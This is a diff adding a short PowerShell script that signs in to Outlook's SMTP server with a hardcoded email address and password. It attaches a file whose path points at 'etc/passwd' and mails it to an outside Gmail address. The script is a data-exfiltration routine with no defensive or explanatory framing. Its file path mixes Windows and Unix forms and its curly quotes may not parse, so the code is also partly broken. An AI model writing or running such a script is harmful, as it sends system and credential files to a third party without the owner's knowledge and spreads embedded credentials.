@@ -1,0 +1,13 @@
+$EmailFrom = “stevensmith23464@outlook.com”  
+$EmailTo = “bvob@gmail.com”  
+$Subject = “subject”  
+$Body = “test”
+$Attachment = 'C:\Users\etc/passwd' 
+$SMTPServer = “smtp.outlook.com” 
+$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPClient.EnableSsl = $true
+$SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body) 
+$attach = New-Object System.Net.Mail.Attachment($Attachment) 
+$SMTPMessage.Attachments.Add($attach) 
+$SMTPClient.Credentials = New-Object System.Net.NetworkCredential(“stevensmith23464@outlook.com”, “password123”); 
+$SMTPClient.Send($SMTPMessage) 
